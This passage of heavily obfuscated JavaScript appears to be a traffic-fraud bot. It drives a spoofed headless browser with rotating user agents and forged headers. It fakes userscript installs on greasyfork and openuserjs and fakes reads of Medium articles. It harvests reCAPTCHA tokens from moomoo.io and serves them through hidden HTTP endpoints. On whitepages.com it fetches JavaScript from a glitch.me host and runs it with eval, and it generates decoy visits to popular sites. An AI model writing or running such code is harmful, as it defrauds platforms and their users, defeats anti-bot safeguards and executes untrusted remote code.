      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0xd) + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x3) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + Y(0x6) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Z(0xf) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + Z(0x1) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + Y(0x9) + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1a5a + 0xa5b + -0x1 * 0x24b5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1865 + -0x2 * 0xc89 + 0xad)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x3 * 0xcf + -0x2b9 * -0x8 + 0x5b * -0x43), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x6d9 + 0x22bd + -0x1b80), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x3a * -0x8f + 0x19 * -0x2c + -0x16 * 0x147;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * -0x1cfb + 0x243c + -0x4137; w < getRandomInt(-0x6d5 + -0x4 * -0x41b + -0x996, 0xd07 + 0x960 + 0x6 * -0x3bb); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x20f5 * 0x4 + 0x2c * 0x371 + 0x8f3 * 0x18);
        }
      }();
    }, 0x1fe3 + 0x3b3 * -0x7 + 0x2 * -0x2cd), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xc92 * 0x1 + 0x1 * -0x26ef + 0x1a5d;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1605 + -0x1b45 + 0x540, 0x21e6 + 0x4d2 * -0x3 + -0x99f * 0x2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x2a17 + -0x17fb + -0x11 * -0x5d4);
    }, 0x1dd4 + 0x5e7 + -0x6d * 0x53), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a0 = c;
        try {
          let s = 0x1c7b * 0x1 + 0x3 * 0xb93 + -0x3f34;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on'](a0(0x0), function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x17 * 0x13 + 0x7d * -0x34 + 0x2367), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x52b + -0x887 + 0xdb2), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x13bcbb + 0x633e8 + 0x1b4473);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2f6 * 0xb + -0x5 * -0x19c + -0x6 * -0x427);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a1 = c,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x18dc + 0x1 * -0x580 + -0x1294);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write'](a1(0x19)), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xce9 * -0x2 + 0x1f5a + -0x199c);
}
doFlags[Y(0x5)] && ((async () => {
  const a5 = d,
    a4 = c,
    a3 = b;
  async function f() {
    const a2 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x65b * -0x1 + 0x1365 * -0x1 + -0x19c1 * -0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x7e3 + -0xb * -0x7f + 0x26f));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * -0x1517 + 0x1 * -0x1316 + 0x3 * -0xab, D['indexOf']('\x20'));
        return B ? E['slice'](-0xafb + -0x14f * -0x5 + 0x470, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x805 + 0x27 * 0x3f + 0x257c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + a2(0x10),
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3ef3 + 0x449 * -0x11 + -0x7c * -0x169),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + a3(0xb, 's12U') + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      a4(0x17) + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + a4(0x1a),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + a5(0x18) + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1b0f + 0x25ee + -0x40fd; k < 0x4f2 + -0x515 + -0x3 * -0xd; k++)
    setTimeout(f, (-0x14 * 0x813 + 0x9 * 0x2793 + 0x27b1) * k * getRandomInt(-0x257e + 0x1b19 + 0x79 * 0x16, -0x89 * -0xf + -0x1ba7 * -0x1 + -0x23ab));
  setInterval(() => {
    f();
    for (let l = -0x16e2 + -0x1 * 0x232d + 0x3a0f; l < -0x1062 + -0x773 * 0x5 + 0x35a5; l++)
      setTimeout(f, (0x2 * 0x9470 + -0x3ce2 + -0x19e) * l * getRandomInt(-0x3 * 0x35e + -0x1 * 0xe3 + -0x15 * -0x86, 0x393 + -0x258d + 0x21fd));
  }, -0x463a73 + 0x69c728 + 0x1361cb);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
